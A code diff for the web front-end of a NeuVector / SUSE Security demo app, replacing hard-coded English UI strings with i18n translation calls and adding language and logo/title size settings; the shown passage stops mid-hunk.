@@ -18,11 +18,14 @@
 /**
  * Tooltip texts for NeuVector concepts
  */
+/**
+ * Dynamic TOOLTIPS that use the i18n system
+ */
 const TOOLTIPS = {
-    networkPolicy: 'Network Policy controls network traffic between containers.\n\n• Discover: Learn and allow all connections\n• Monitor: Allow all, log violations\n• Protect: Block unauthorized connections',
-    processProfile: 'Process Profile controls which processes can run in containers.\n\n• Discover: Learn and allow all processes\n• Monitor: Allow all, log violations\n• Protect: Block unauthorized processes (SIGKILL)',
-    baseline: 'Baseline determines how process rules are generated.\n\n• zero-drift: Only processes from original image allowed\n• basic: Allow processes learned during Discover mode',
-    allowedProcesses: 'List of processes allowed to run in this container.\n\nIn Protect mode, any process not in this list will be killed (SIGKILL, exit code 137).'
+    get networkPolicy() { return t('tooltip.networkPolicy'); },
+    get processProfile() { return t('tooltip.processProfile'); },
+    get baseline() { return t('tooltip.baseline'); },
+    get allowedProcesses() { return t('tooltip.allowedProcesses'); },
 };
 
 /**
@@ -36,6 +39,8 @@ class SettingsManager {
         this.TITLE_KEY = 'neuvector_title';
         this.API_URL_KEY = 'neuvector_api_url';
         this.REGISTRY_KEY = 'neuvector_registry';
+        this.TITLE_SIZE_KEY = 'neuvector_title_size';
+        this.LOGO_SIZE_KEY = 'neuvector_logo_size';
         this.modal = document.getElementById('settings-modal');
         this.usernameInput = document.getElementById('settings-username');
         this.passwordInput = document.getElementById('settings-password');
@@ -103,6 +108,56 @@ class SettingsManager {
         this.logoFileInput?.addEventListener('change', (e) => this.handleLogoUpload(e));
         this.removeLogo?.addEventListener('click', () => this.handleLogoRemove());
 
+        // Language selector
+        const langSelect = document.getElementById('settings-language');
+        if (langSelect) {
+            langSelect.value = i18n.getLang();
+            langSelect.addEventListener('change', () => {
+                i18n.setLang(langSelect.value);
+            });
+        }
+
+        // Title size slider
+        const titleSizeSlider = document.getElementById('settings-title-size');
+        const titleSizeValue = document.getElementById('settings-title-size-value');
+        const savedTitleSize = localStorage.getItem(this.TITLE_SIZE_KEY) || '20';
+        if (titleSizeSlider) {
+            titleSizeSlider.value = savedTitleSize;
+            if (titleSizeValue) titleSizeValue.textContent = savedTitleSize + 'px';
+            titleSizeSlider.addEventListener('input', () => {
+                const size = titleSizeSlider.value;
+                if (titleSizeValue) titleSizeValue.textContent = size + 'px';
+                if (this.headerTitle) this.headerTitle.style.fontSize = size + 'px';
+                localStorage.setItem(this.TITLE_SIZE_KEY, size);
+            });
+        }
+        // Apply saved title size
+        if (this.headerTitle) {
+            this.headerTitle.style.fontSize = savedTitleSize + 'px';
+        }
+
+        // Logo size slider
+        const logoSizeSlider = document.getElementById('settings-logo-size');
+        const logoSizeValue = document.getElementById('settings-logo-size-value');
+        const savedLogoSize = localStorage.getItem(this.LOGO_SIZE_KEY) || '36';
+        if (logoSizeSlider) {
+            logoSizeSlider.value = savedLogoSize;
+            if (logoSizeValue) logoSizeValue.textContent = savedLogoSize + 'px';
+            logoSizeSlider.addEventListener('input', () => {
+                const size = logoSizeSlider.value;
+                if (logoSizeValue) logoSizeValue.textContent = size + 'px';
+                if (this.headerLogo) this.headerLogo.style.height = size + 'px';
+                localStorage.setItem(this.LOGO_SIZE_KEY, size);
+            });
+        }
+        // Apply saved logo size
+        if (this.headerLogo) {
+            this.headerLogo.style.height = savedLogoSize + 'px';
+        }
+
+        // Apply i18n translations on load
+        i18n.applyTranslations();
+
         // Close on overlay click
         this.modal?.addEventListener('click', (e) => {
             if (e.target === this.modal) this.closeModal();
@@ -144,7 +199,7 @@ class SettingsManager {
             const gitInfoRow = document.getElementById('git-info-row');
 
             if (versionEl) {
-                versionEl.textContent = data.version || 'Unknown';
+                versionEl.textContent = data.version || t('settings.unknown');
             }
 
             if (data.git_commit && gitInfoEl && gitInfoRow) {
@@ -159,7 +214,7 @@ class SettingsManager {
             console.error('Failed to fetch version:', error);
             const versionEl = document.getElementById('app-version');
             if (versionEl) {
-                versionEl.textContent = 'Error';
+                versionEl.textContent = t('settings.error');
             }
         }
     }
@@ -172,13 +227,25 @@ class SettingsManager {
         if (this.titleInput) {
             this.titleInput.value = title;
         }
+        // Refresh language selector
+        const langSelect = document.getElementById('settings-language');
+        if (langSelect) langSelect.value = i18n.getLang();
+        // Refresh size sliders
+        const titleSizeSlider = document.getElementById('settings-title-size');
+        const titleSizeValue = document.getElementById('settings-title-size-value');
+        const savedTitleSize = localStorage.getItem(this.TITLE_SIZE_KEY) || '20';
+        if (titleSizeSlider) { titleSizeSlider.value = savedTitleSize; if (titleSizeValue) titleSizeValue.textContent = savedTitleSize + 'px'; }
+        const logoSizeSlider = document.getElementById('settings-logo-size');
+        const logoSizeValue = document.getElementById('settings-logo-size-value');
+        const savedLogoSize = localStorage.getItem(this.LOGO_SIZE_KEY) || '36';
+        if (logoSizeSlider) { logoSizeSlider.value = savedLogoSize; if (logoSizeValue) logoSizeValue.textContent = savedLogoSize + 'px'; }
         // Refresh logo preview
         const logoData = localStorage.getItem(this.LOGO_KEY);
         if (logoData) {
             this.displayLogo(logoData);
         } else {
             if (this.logoPreview) {
-                this.logoPreview.innerHTML = '<span class="logo-placeholder">No logo</span>';
+                this.logoPreview.innerHTML = `<span class="logo-placeholder">${t('settings.noLogo')}</span>`;
             }
             if (this.removeLogo) {
                 this.removeLogo.style.display = 'none';
@@ -259,7 +326,7 @@ class SettingsManager {
             this.checkApiStatus(); // Refresh API status
             this.closeModal();
         } catch (error) {
-            this.showStatus('Failed to save settings', 'error');
+            this.showStatus(t('status.failedSave'), 'error');
         }
     }
 
@@ -321,11 +388,11 @@ class SettingsManager {
                 clusterStatusValue.textContent = `${shortName} (${info.node_count}n)`;
                 clusterStatusBox.className = 'header-status-box ok';
             } else {
-                clusterStatusValue.textContent = 'Disconnected';
+                clusterStatusValue.textContent = t('cluster.disconnected');
                 clusterStatusBox.className = 'header-status-box error';
             }
         } catch (error) {
-            clusterStatusValue.textContent = 'Error';
+            clusterStatusValue.textContent = t('cluster.error');
             clusterStatusBox.className = 'header-status-box error';
         }
     }
@@ -381,11 +448,11 @@ class SettingsManager {
         const password = this.passwordInput?.value || '';
 
         if (!password) {
-            this.showStatus('Please enter a password', 'error');
+            this.showStatus(t('status.enterPassword'), 'error');
             return;
         }
 
-        this.showStatus('Testing connection...', 'testing');
+        this.showStatus(t('status.testingConnection'), 'testing');
 
         try {
             const api_url = this.apiUrlInput?.value?.trim() || '';
@@ -398,9 +465,9 @@ class SettingsManager {
             const result = await response.json();
 
             if (result.success) {
-                this.showStatus('Connection successful!', 'success');
+                this.showStatus(t('status.connectionSuccess'), 'success');
             } else {
-                this.showStatus(`Connection failed: ${result.message}`, 'error');
+                this.showStatus(`${t('status.connectionFailed')} ${result.message}`, 'error');
             }
         } catch (error) {
             this.showStatus(`Error: ${error.message}`, 'error');
@@ -412,7 +479,7 @@ class SettingsManager {
         const registryStatus = document.getElementById('registry-status');
 
         if (registryStatus) {
-            registryStatus.textContent = 'Testing registry...';
+            registryStatus.textContent = t('status.testingRegistry');
             registryStatus.className = 'settings-status testing';
         }
 
@@ -450,14 +517,14 @@ class SettingsManager {
 
         if (!password) {
             if (resetStatus) {
-                resetStatus.textContent = 'Please enter NeuVector password first';
+                resetStatus.textContent = t('status.enterNvPassword');
                 resetStatus.className = 'settings-status error';
             }
             return;
         }
 
         if (resetStatus) {
-            resetStatus.textContent = 'Resetting rules...';
+            resetStatus.textContent = t('status.resettingRules');
             resetStatus.className = 'settings-status testing';
         }
 
@@ -587,13 +654,13 @@ class SettingsManager {
 
         // Check file type
         if (!file.type.startsWith('image/')) {
-            alert('Please select an image file');
+            alert(t('alert.selectImage'));
             return;
         }
 
         // Check file size (max 500KB)
         if (file.size > 500 * 1024) {
-            alert('Image must be smaller than 500KB');
+            alert(t('alert.imageTooLarge'));
             return;
         }
 
@@ -606,7 +673,7 @@ class SettingsManager {
                     this.displayLogo(dataUrl);
                 } catch (error) {
                     console.error('Failed to save logo:', error);
-                    alert('Failed to save logo. The image may be too large.');
+                    alert(t('alert.failedSaveLogo'));
                 }
             }
         };
@@ -631,7 +698,7 @@ class SettingsManager {
 
         // Reset preview
         if (this.logoPreview) {
-            this.logoPreview.innerHTML = '<span class="logo-placeholder">No logo</span>';
+            this.logoPreview.innerHTML = `<span class="logo-placeholder">${t('settings.noLogo')}</span>`;
         }
 
         // Hide remove button
@@ -722,7 +789,7 @@ class SettingsManager {
         // Disable button and show loading state
         if (btn) {
             btn.disabled = true;
-            btn.textContent = 'Running...';
+            btn.textContent = t('settings.running');
         }
 
         // Reset all items to checking state
@@ -730,7 +797,7 @@ class SettingsManager {
         this.setAllDiagnosticsChecking();
 
         if (summary) {
-            summary.textContent = 'Checking...';
+            summary.textContent = t('settings.checking');
             summary.className = 'diagnostics-summary';
         }
 
@@ -757,7 +824,7 @@ class SettingsManager {
         } finally {
             if (btn) {
                 btn.disabled = false;
-                btn.textContent = 'Run All Checks';
+                btn.textContent = t('btn.runAllChecks');
             }
         }
     }
@@ -775,7 +842,7 @@ class SettingsManager {
                 icon.textContent = '...';
             }
             if (message) {
-                message.textContent = 'Checking...';
+                message.textContent = t('settings.checking');
             }
             item.className = 'diagnostic-item';
         });
@@ -859,7 +926,7 @@ class SettingsManager {
         if (summaryEl) {
             const passedCount = summary.ok;
             const totalCount = summary.total;
-            summaryEl.textContent = `${passedCount}/${totalCount} passed`;
+            summaryEl.textContent = `${passedCount}/${totalCount} ${t('diag.passed')}`;
 
             // Color based on results
             if (summary.error > 0) {
@@ -1123,7 +1190,7 @@ class DemoApp {
         if (sensorsListContainer) {
             const realSensors = sensors.filter(s => s.value !== 'custom');
             if (realSensors.length === 0) {
-                sensorsListContainer.innerHTML = '<div class="viz-no-sensors">No DLP sensors configured</div>';
+                sensorsListContainer.innerHTML = `<div class="viz-no-sensors">${t('viz.noDlpSensors')}</div>`;
             } else {
                 sensorsListContainer.innerHTML = realSensors.map(sensor => {
                     const sensorKey = sensor.value.replace('sensor.', '');
@@ -1457,7 +1524,7 @@ class DemoApp {
                 this.updateRunStatus(message.status, message.message);
                 // Update visualization on status change
                 if (message.status === 'running') {
-                    this.updateVisualization('running', 'Connecting...');
+                    this.updateVisualization('running', t('viz.connecting'));
                 }
                 break;
             case 'error':
@@ -1482,7 +1549,7 @@ class DemoApp {
 
         // Detect attack blocked (for attack demo)
         if (text.includes('[BLOCKED]')) {
-            this.detectedResult = { state: 'blocked', message: 'Attack blocked by SUSE Security' };
+            this.detectedResult = { state: 'blocked', message: t('viz.attackBlocked') };
             return;
         }
 
@@ -1491,7 +1558,7 @@ class DemoApp {
         if (lowerText.includes('exit code 124')) {
             // For attack demos, timeout means the attack ran successfully (not blocked)
             if (this.currentDemoType === 'attack') {
-                this.detectedResult = { state: 'success', message: 'Attack succeeded - consider enabling Protect mode' };
+                this.detectedResult = { state: 'success', message: t('viz.attackSucceeded') };
             }
             return;
         }
@@ -1508,19 +1575,19 @@ class DemoApp {
             lowerText.includes('operation not permitted') ||
             lowerText.includes('not found') ||
             (text.includes('[ERROR]') && (lowerText.includes('process') || lowerText.includes('terminated')))) {
-            this.detectedResult = { state: 'intercepted', message: 'Process blocked by SUSE Security' };
+            this.detectedResult = { state: 'intercepted', message: t('viz.processBlocked') };
             return;
         }
 
         // Detect success
         if (text.includes('[OK]') || lowerText.includes('success')) {
-            this.detectedResult = { state: 'success', message: 'Command executed successfully' };
+            this.detectedResult = { state: 'success', message: t('viz.commandSuccess') };
             return;
         }
 
         // Detect warning (attack succeeded - not blocked)
         if (text.includes('[WARNING]') && this.currentDemoType === 'attack') {
-            this.detectedResult = { state: 'success', message: 'Attack succeeded - consider enabling Protect mode' };
+            this.detectedResult = { state: 'success', message: t('viz.attackSucceeded') };
             return;
         }
 
@@ -1530,9 +1597,9 @@ class DemoApp {
             // For DLP demos, check if it's really a success or just "not blocked"
             if (this.currentDemoType === 'dlp') {
                 // In DLP Alert mode, data passes through - show warning state
-                this.detectedResult = { state: 'success', message: 'Data sent (DLP in Alert mode - check NeuVector logs)' };
+                this.detectedResult = { state: 'success', message: t('viz.dataSentDlp') };
             } else {
-                this.detectedResult = { state: 'success', message: 'HTTP request successful' };
+                this.detectedResult = { state: 'success', message: t('viz.httpSuccess') };
             }
             return;
         }
@@ -1541,16 +1608,16 @@ class DemoApp {
         if (lowerText.includes('bytes from') || (lowerText.includes('time=') && lowerText.includes('ms'))) {
             // For attack demo, ping success means attack was NOT blocked
             if (this.currentDemoType === 'attack') {
-                this.detectedResult = { state: 'success', message: 'Attack succeeded - consider enabling Protect mode' };
+                this.detectedResult = { state: 'success', message: t('viz.attackSucceeded') };
             } else {
-                this.detectedResult = { state: 'success', message: 'Ping successful' };
+                this.detectedResult = { state: 'success', message: t('viz.pingSuccess') };
             }
             return;
         }
 
         // Detect nmap success (open ports)
         if (lowerText.includes('/tcp') && lowerText.includes('open')) {
-            this.detectedResult = { state: 'success', message: 'Port scan completed' };
+            this.detectedResult = { state: 'success', message: t('viz.portScanComplete') };
             return;
         }
 
@@ -1563,13 +1630,13 @@ class DemoApp {
             lowerText.includes('no route to host') ||
             lowerText.includes('exit code 28') ||
             (text.includes('[ERROR]') && lowerText.includes('curl'))) {
-            this.detectedResult = { state: 'blocked', message: 'Network blocked by policy' };
+            this.detectedResult = { state: 'blocked', message: t('viz.networkBlocked') };
             return;
         }
 
         // Detect running/connecting - only update if no result detected yet
         if (!this.detectedResult && (text.includes('[CMD]') || lowerText.includes('executing') || lowerText.includes('connecting') || lowerText.includes('simulating'))) {
-            this.updateVisualization('running', 'Running attack simulation...');
+            this.updateVisualization('running', t('viz.runningAttack'));
         }
     }
 
@@ -1581,7 +1648,7 @@ class DemoApp {
             this.statusDot.className = 'status-dot ' + status;
         }
         if (this.statusText) {
-            this.statusText.textContent = status === 'connected' ? 'Connected' : 'Disconnected';
+            this.statusText.textContent = status === 'connected' ? t('header.connected') : t('header.disconnected');
             this.statusText.className = 'status ' + status;
         }
     }
@@ -1662,7 +1729,7 @@ class DemoApp {
         }
 
         this.appendOutput('');
-        this.appendOutput(success ? '[DONE] Operation completed successfully' : `[FAILED] ${message || 'Operation failed'}`, success ? 'info' : 'error');
+        this.appendOutput(success ? t('complete.success') : `${t('complete.failed')} ${message || ''}`, success ? 'info' : 'error');
 
         // Update visualization based on detected result or completion status
         if (this.vizContainer) {
@@ -1670,7 +1737,7 @@ class DemoApp {
             if (this.detectedResult) {
                 this.updateVisualization(this.detectedResult.state, this.detectedResult.message);
             } else if (success) {
-                this.updateVisualization('success', 'Connection successful');
+                this.updateVisualization('success', t('viz.connectionSuccessful'));
             } else {
                 // Determine failure type from message
                 const lowerMsg = (message || '').toLowerCase();
@@ -1680,9 +1747,9 @@ class DemoApp {
                     lowerMsg.includes('sigkill') ||
                     lowerMsg.includes('process') ||
                     lowerMsg.includes('denied')) {
-                    this.updateVisualization('intercepted', 'Process blocked by SUSE Security');
+                    this.updateVisualization('intercepted', t('viz.processBlocked'));
                 } else if (lowerMsg.includes('28') || lowerMsg.includes('timeout')) {
-                    this.updateVisualization('blocked', 'Connection blocked (timeout)');
+                    this.updateVisualization('blocked', t('viz.connectionBlockedTimeout'));
                 } else {
                     this.updateVisualization('blocked', message || 'Connection failed');
                 }
@@ -2089,13 +2156,13 @@ class DemoApp {
         const groupName = `nv.${serviceName}.neuvector-demo`;
 
         // Show loading state
-        list.innerHTML = 'Loading...';
+        list.innerHTML = t('events.loading');
         list.className = 'process-rules-list loading';
         if (count) count.textContent = '';
 
         const credentials = settingsManager.getCredentials();
         if (!credentials.password) {
-            list.innerHTML = 'Configure SUSE Security credentials first';
+            list.innerHTML = t('events.configureCredentials');
             list.className = 'process-rules-list empty';
             return;
         }
@@ -2126,7 +2193,7 @@ class DemoApp {
                             <span class="process-rule-path">${this.escapeHtml(p.path)}</span>
                         </div>
                         <span class="process-rule-type ${p.cfg_type}">${p.cfg_type}</span>
-                        <button class="btn-delete-rule" title="Delete this rule">&times;</button>
+                        <button class="btn-delete-rule" title="${t('process.deleteRule')}">&times;</button>
                     </div>
                 `).join('');
                 list.className = 'process-rules-list';
@@ -2146,7 +2213,7 @@ class DemoApp {
                     });
                 });
             } else if (result.success) {
-                list.innerHTML = 'No process rules';
+                list.innerHTML = t('process.noRules');
                 list.className = 'process-rules-list empty';
             } else {
                 list.innerHTML = result.message || 'Failed to load';
@@ -2154,7 +2221,7 @@ class DemoApp {
             }
         } catch (error) {
             console.error('Failed to get process rules:', error);
-            list.innerHTML = 'Error loading rules';
+            list.innerHTML = t('process.errorLoading');
             list.className = 'process-rules-list empty';
         }
     }
@@ -2354,18 +2421,18 @@ class DemoApp {
             sourceExtraContent = `
                 <div class="viz-dlp-settings" id="viz-dlp-settings">
                     <div class="viz-setting-row">
-                        <span class="viz-setting-label">Data Type</span>
+                        <span class="viz-setting-label">${t('viz.dataType')}</span>
                         <select class="viz-setting-select viz-dlp-select" id="viz-data-type" name="data_type">${dataTypeOptions}</select>
                     </div>
                     <div class="viz-setting-row" id="viz-custom-data-row" style="display:none;">
-                        <span class="viz-setting-label">Custom Data</span>
-                        <input type="text" class="viz-setting-input" id="viz-custom-data" name="custom_data" placeholder="Enter data...">
+                        <span class="viz-setting-label">${t('viz.customData')}</span>
+                        <input type="text" class="viz-setting-input" id="viz-custom-data" name="custom_data" placeholder="${t('viz.enterData')}">
                     </div>
                 </div>
                 <div class="viz-dlp-sensors" id="viz-dlp-sensors">
-                    <div class="viz-dlp-sensors-header">DLP Sensors <button type="button" class="viz-refresh-btn" id="viz-refresh-sensors" title="Refresh sensors">↻</button></div>
+                    <div class="viz-dlp-sensors-header">${t('viz.dlpSensors')} <button type="button" class="viz-refresh-btn" id="viz-refresh-sensors" title="${t('viz.refreshSensors')}">↻</button></div>
                     <div id="viz-dlp-sensors-list">
-                        <div class="viz-loading">Loading sensors...</div>
+                        <div class="viz-loading">${t('viz.loadingSensors')}</div>
                     </div>
                 </div>
             `;
@@ -2378,34 +2445,34 @@ class DemoApp {
                 <select class="viz-select" id="viz-target-type" name="target_type">${targetTypeOptions}</select>
                 <select class="viz-select" id="viz-target-pod" name="target_pod" style="display:none;">${targetPodOptions}</select>
                 <select class="viz-select" id="viz-target-public" name="target_public">${targetPublicOptions}</select>
-                <input type="text" class="viz-select" id="viz-target-custom" name="target_custom" placeholder="hostname/IP" style="display:none;">
+                <input type="text" class="viz-select" id="viz-target-custom" name="target_custom" placeholder="${t('viz.hostnameIp')}" style="display:none;">
                 <div class="viz-pod-settings" id="viz-target-settings">
                     <div class="viz-setting-row">
-                        <span class="viz-setting-label has-tooltip" title="${TOOLTIPS.networkPolicy}">Network Policy</span>
+                        <span class="viz-setting-label has-tooltip" title="${TOOLTIPS.networkPolicy}">${t('viz.networkPolicy')}</span>
                         <select class="viz-setting-select" id="viz-tgt-policy-mode" data-field="policy_mode" data-target="target">${modeOptions}</select>
                     </div>
                     <div class="viz-setting-row">
-                        <span class="viz-setting-label has-tooltip" title="${TOOLTIPS.processProfile}">Process Profile</span>
+                        <span class="viz-setting-label has-tooltip" title="${TOOLTIPS.processProfile}">${t('viz.processProfile')}</span>
                         <select class="viz-setting-select" id="viz-tgt-profile-mode" data-field="profile_mode" data-target="target">${modeOptions}</select>
                     </div>
                     <div class="viz-setting-row">
-                        <span class="viz-setting-label has-tooltip" title="${TOOLTIPS.baseline}">Baseline</span>
+                        <span class="viz-setting-label has-tooltip" title="${TOOLTIPS.baseline}">${t('viz.baseline')}</span>
                         <select class="viz-setting-select" id="viz-tgt-baseline" data-field="baseline_profile" data-target="target">${baselineOptions}</select>
                     </div>
                 </div>
                 <div class="viz-process-list" id="viz-target-processes">
                     <div class="viz-process-header">
-                        <span class="has-tooltip" title="${TOOLTIPS.allowedProcesses}">Allowed Processes</span>
+                        <span class="has-tooltip" title="${TOOLTIPS.allowedProcesses}">${t('viz.allowedProcesses')}</span>
                         <span id="viz-tgt-process-count"></span>
                     </div>
-                    <div class="viz-process-items loading" id="viz-tgt-process-items">Loading...</div>
+                    <div class="viz-process-items loading" id="viz-tgt-process-items">${t('process.loading')}</div>
                 </div>
             `;
         } else if (isDLPDemo) {
             targetContent = `
                 <select class="viz-select" id="viz-dlp-target" name="target">${dlpTargetOptions}</select>
                 <div class="viz-dlp-sensors" id="viz-tgt-dlp-sensors">
-                    <div class="viz-dlp-sensors-header">DLP Sensors</div>
+                    <div class="viz-dlp-sensors-header">${t('viz.dlpSensors')}</div>
                     <div class="viz-dlp-sensor-row">
                         <label class="viz-toggle">
                             <input type="checkbox" id="viz-tgt-sensor-creditcard" data-sensor="sensor.creditcard" data-target="target">
@@ -2431,24 +2498,24 @@ class DemoApp {
                 </div>
                 <div class="viz-pod-settings" id="viz-target-settings">
                     <div class="viz-setting-row">
-                        <span class="viz-setting-label">Network Policy</span>
+                        <span class="viz-setting-label">${t('viz.networkPolicy')}</span>
                         <select class="viz-setting-select" id="viz-tgt-policy-mode" data-field="policy_mode" data-target="target">${modeOptions}</select>
                     </div>
                     <div class="viz-setting-row">
-                        <span class="viz-setting-label">Process Profile</span>
+                        <span class="viz-setting-label">${t('viz.processProfile')}</span>
                         <select class="viz-setting-select" id="viz-tgt-profile-mode" data-field="profile_mode" data-target="target">${modeOptions}</select>
                     </div>
                     <div class="viz-setting-row">
-                        <span class="viz-setting-label">Baseline</span>
+                        <span class="viz-setting-label">${t('viz.baseline')}</span>
                         <select class="viz-setting-select" id="viz-tgt-baseline" data-field="baseline_profile" data-target="target">${baselineOptions}</select>
                     </div>
                 </div>
                 <div class="viz-process-list" id="viz-target-processes">
                     <div class="viz-process-header">
-                        <span>Allowed Processes</span>
+                        <span>${t('viz.allowedProcesses')}</span>
                         <span id="viz-tgt-process-count"></span>
                     </div>
-                    <div class="viz-process-items loading" id="viz-tgt-process-items">Loading...</div>
+                    <div class="viz-process-items loading" id="viz-tgt-process-items">${t('process.loading')}</div>
                 </div>
             `;
         }
@@ -2458,17 +2525,17 @@ class DemoApp {
         if (isConnectivityDemo) {
             commandsSection = `
                 <div class="viz-commands" id="viz-commands">
-                    <button type="button" class="btn btn-primary btn-cmd active" data-cmd="curl" title="HTTP request">curl</button>
-                    <button type="button" class="btn btn-outline btn-cmd" data-cmd="ping" title="ICMP ping">ping</button>
-                    <button type="button" class="btn btn-outline btn-cmd" data-cmd="ssh" title="SSH connection">ssh</button>
-                    <button type="button" class="btn btn-outline btn-cmd" data-cmd="nmap" title="Port scan">nmap</button>
+                    <button type="button" class="btn btn-primary btn-cmd active" data-cmd="curl" title="${t('cmd.httpRequest')}">curl</button>
+                    <button type="button" class="btn btn-outline btn-cmd" data-cmd="ping" title="${t('cmd.icmpPing')}">ping</button>
+                    <button type="button" class="btn btn-outline btn-cmd" data-cmd="ssh" title="${t('cmd.sshConnection')}">ssh</button>
+                    <button type="button" class="btn btn-outline btn-cmd" data-cmd="nmap" title="${t('cmd.portScan')}">nmap</button>
                 </div>
             `;
         } else if (isDLPDemo) {
             commandsSection = `
                 <div class="viz-commands" id="viz-commands">
-                    <button type="button" class="btn btn-primary btn-run-demo" id="btn-viz-run-dlp" title="Send DLP test data">
-                        Run DLP Test
+                    <button type="button" class="btn btn-primary btn-run-demo" id="btn-viz-run-dlp" title="${t('cmd.sendDlpData')}">
+                        ${t('btn.runDlpTest')}
                     </button>
                 </div>
             `;
@@ -2481,7 +2548,7 @@ class DemoApp {
                         <div class="viz-box viz-source pending" id="viz-source">
                             <div class="viz-box-header">
                                 <div class="viz-icon">🐳</div>
-                                <div class="viz-label">Source</div>
+                                <div class="viz-label">${t('viz.source')}</div>
                                 <div class="viz-mode-icons" id="viz-src-mode-icons">
                                     <span class="viz-mode-icon network" id="viz-src-icon-network" title="${TOOLTIPS.networkPolicy}">🔍</span>
                                     <span class="viz-mode-icon process" id="viz-src-icon-process" title="${TOOLTIPS.processProfile}">🔍</span>
@@ -2491,24 +2558,24 @@ class DemoApp {
                             ${sourceExtraContent}
                             <div class="viz-pod-settings" id="viz-source-settings">
                                 <div class="viz-setting-row">
-                                    <span class="viz-setting-label has-tooltip" title="${TOOLTIPS.networkPolicy}">Network Policy</span>
+                                    <span class="viz-setting-label has-tooltip" title="${TOOLTIPS.networkPolicy}">${t('viz.networkPolicy')}</span>
                                     <select class="viz-setting-select" id="viz-src-policy-mode" data-field="policy_mode" data-target="source">${modeOptions}</select>
                                 </div>
                                 <div class="viz-setting-row">
-                                    <span class="viz-setting-label has-tooltip" title="${TOOLTIPS.processProfile}">Process Profile</span>
+                                    <span class="viz-setting-label has-tooltip" title="${TOOLTIPS.processProfile}">${t('viz.processProfile')}</span>
                                     <select class="viz-setting-select" id="viz-src-profile-mode" data-field="profile_mode" data-target="source">${modeOptions}</select>
                                 </div>
                                 <div class="viz-setting-row">
-                                    <span class="viz-setting-label has-tooltip" title="${TOOLTIPS.baseline}">Baseline</span>
+                                    <span class="viz-setting-label has-tooltip" title="${TOOLTIPS.baseline}">${t('viz.baseline')}</span>
                                     <select class="viz-setting-select" id="viz-src-baseline" data-field="baseline_profile" data-target="source">${baselineOptions}</select>
                                 </div>
                             </div>
                             <div class="viz-process-list" id="viz-source-processes">
                                 <div class="viz-process-header">
-                                    <span class="has-tooltip" title="${TOOLTIPS.allowedProcesses}">Allowed Processes</span>
+                                    <span class="has-tooltip" title="${TOOLTIPS.allowedProcesses}">${t('viz.allowedProcesses')}</span>
                                     <span id="viz-src-process-count"></span>
                                 </div>
-                                <div class="viz-process-items loading" id="viz-src-process-items">Loading...</div>
+                                <div class="viz-process-items loading" id="viz-src-process-items">${t('process.loading')}</div>
                             </div>
                         </div>
                         <div class="viz-arrow pending" id="viz-arrow">
@@ -2518,7 +2585,7 @@ class DemoApp {
                         <div class="viz-box viz-target pending ${isDLPDemo ? '' : ''}" id="viz-target">
                             <div class="viz-box-header">
                                 <div class="viz-icon" id="viz-target-icon">🌐</div>
-                                <div class="viz-label">Target</div>
+                                <div class="viz-label">${t('viz.target')}</div>
                                 <div class="viz-mode-icons" id="viz-tgt-mode-icons">
                                     <span class="viz-mode-icon network" id="viz-tgt-icon-network" title="${TOOLTIPS.networkPolicy}">🔍</span>
                                     <span class="viz-mode-icon process" id="viz-tgt-icon-process" title="${TOOLTIPS.processProfile}">🔍</span>
@@ -2529,19 +2596,19 @@ class DemoApp {
                     </div>
                     <div class="viz-status pending" id="viz-status">
                         <span class="viz-status-dot"></span>
-                        <span class="viz-status-text">Ready</span>
+                        <span class="viz-status-text">${t('viz.ready')}</span>
                     </div>
                     ${commandsSection}
                 </div>
                 <div class="nv-logs-container" id="nv-logs-container">
                     <div class="nv-logs-header">
-                        <span>SUSE Security Events</span>
+                        <span>${t('events.suseSecurityEvents')}</span>
                         <span class="nv-logs-time" id="nv-logs-time"></span>
-                        <button type="button" class="btn-clear-logs" id="btn-clear-logs" title="Clear events">🗑</button>
-                        <button type="button" class="btn-refresh" id="btn-refresh-logs" title="Refresh events">↻</button>
+                        <button type="button" class="btn-clear-logs" id="btn-clear-logs" title="${t('events.clearEvents')}">🗑</button>
+                        <button type="button" class="btn-refresh" id="btn-refresh-logs" title="${t('events.refreshEvents')}">↻</button>
                     </div>
                     <div class="nv-logs-list empty" id="nv-logs-list">
-                        Click refresh to load events
+                        ${t('events.clickRefresh')}
                     </div>
                 </div>
                 ${isConnectivityDemo ? '<input type="hidden" id="param-command" name="command" value="curl">' : ''}
@@ -2881,17 +2948,17 @@ class DemoApp {
         if (networkIcon) {
             if (policyMode === 'Protect') {
                 networkIcon.textContent = '🔒';
-                networkIcon.title = 'Network Policy: Protect';
+                networkIcon.title = t('tooltip.networkProtect');
                 networkIcon.classList.remove('monitor', 'discover');
                 networkIcon.classList.add('protect');
             } else if (policyMode === 'Monitor') {
                 networkIcon.textContent = '🔍';
-                networkIcon.title = 'Network Policy: Monitor';
+                networkIcon.title = t('tooltip.networkMonitor');
                 networkIcon.classList.remove('protect', 'discover');
                 networkIcon.classList.add('monitor');
             } else {
                 networkIcon.textContent = '👁️';
-                networkIcon.title = 'Network Policy: Discover';
+                networkIcon.title = t('tooltip.networkDiscover');
                 networkIcon.classList.remove('protect', 'monitor');
                 networkIcon.classList.add('discover');
             }
@@ -2900,17 +2967,17 @@ class DemoApp {
         if (processIcon) {
             if (profileMode === 'Protect') {
                 processIcon.textContent = '🔒';
-                processIcon.title = 'Process Profile: Protect';
+                processIcon.title = t('tooltip.processProtect');
                 processIcon.classList.remove('monitor', 'discover');
                 processIcon.classList.add('protect');
             } else if (profileMode === 'Monitor') {
                 processIcon.textContent = '🔍';
-                processIcon.title = 'Process Profile: Monitor';
+                processIcon.title = t('tooltip.processMonitor');
                 processIcon.classList.remove('protect', 'discover');
                 processIcon.classList.add('monitor');
             } else {
                 processIcon.textContent = '👁️';
-                processIcon.title = 'Process Profile: Discover';
+                processIcon.title = t('tooltip.processDiscover');
                 processIcon.classList.remove('protect', 'monitor');
                 processIcon.classList.add('discover');
             }
@@ -2932,13 +2999,13 @@ class DemoApp {
         const groupName = `nv.${serviceName}.neuvector-demo`;
 
         // Show loading state
-        list.innerHTML = 'Loading...';
+        list.innerHTML = t('events.loading');
         list.className = 'viz-process-items loading';
         if (count) count.textContent = '';
 
         const credentials = settingsManager.getCredentials();
         if (!credentials.password) {
-            list.innerHTML = 'Not configured';
+            list.innerHTML = t('process.notConfigured');
             list.className = 'viz-process-items empty';
             return;
         }
@@ -2968,7 +3035,7 @@ class DemoApp {
                     <div class="viz-process-item" data-name="${this.escapeHtml(p.name)}" data-path="${this.escapeHtml(p.path)}">
                         <span class="viz-process-name">${this.escapeHtml(p.name)}</span>
                         <span class="viz-process-type ${p.cfg_type}">${p.cfg_type}</span>
-                        <button type="button" class="viz-btn-delete" title="Delete">&times;</button>
